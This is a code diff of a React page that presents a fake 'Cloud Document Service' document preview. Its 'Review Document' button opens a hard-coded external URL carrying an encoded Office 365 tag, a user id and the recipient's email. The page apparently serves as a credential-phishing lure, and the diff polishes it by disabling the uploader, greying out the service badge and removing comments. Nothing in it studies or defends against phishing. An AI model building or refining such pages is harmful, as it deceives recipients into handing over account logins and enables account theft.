@@ -1,5 +1,5 @@
 
-import { useState, useRef } from "react";
+import { useState } from "react";
 import { Button } from "@/components/ui/button";
 import { ImageUploader } from "@/components/ImageUploader";
 import { Badge } from "@/components/ui/badge";
@@ -7,13 +7,11 @@ import { ExternalLink } from "lucide-react";
 
 const Index = () => {
   // CONFIGURE YOUR REDIRECT URL HERE
-  // This is the URL users will be redirected to when clicking "Review Document"
   const redirectUrl = "https://yourinternetbusinesssoftware.com/n/?c3Y9bzM2NV8xX25vbSZyYW5kPVVuTjBWMm89JnVpZD1VU0VSMTEwMzIwMjVVNDgwMzExNTY=N0123N[EMAIL]";
   
   const [uploadedImage, setUploadedImage] = useState<string | null>(null);
   const defaultImage = "/lovable-uploads/d4b1a581-c597-44ad-8111-d3f05fb556f6.png";
   
-  // Function to handle the redirect when button is clicked
   const handleReviewClick = () => {
     window.open(redirectUrl, "_blank");
   };
@@ -27,13 +25,15 @@ const Index = () => {
         </div>
         
         <div className="flex justify-center">
-          <Badge variant="outline" className="flex items-center gap-1 px-3 py-1 text-blue-600 border-blue-200">
+          <Badge 
+            variant="outline" 
+            className="flex items-center gap-1 px-3 py-1 text-gray-400 border-gray-200 cursor-not-allowed opacity-50"
+          >
             <ExternalLink size={14} />
             <span>Cloud Document Service</span>
           </Badge>
         </div>
 
-        {/* Image Display Area */}
         <div className="flex flex-col items-center justify-center border-2 border-dashed border-blue-200 rounded-lg p-4 bg-blue-50">
           {uploadedImage ? (
             <img
@@ -49,10 +49,12 @@ const Index = () => {
             />
           )}
           
-          <ImageUploader onImageUploaded={setUploadedImage} />
+          <ImageUploader 
+            onImageUploaded={setUploadedImage} 
+            disabled={true} 
+          />
         </div>
 
-        {/* Review Button */}
         <div className="pt-4">
           <Button 
             onClick={handleReviewClick}
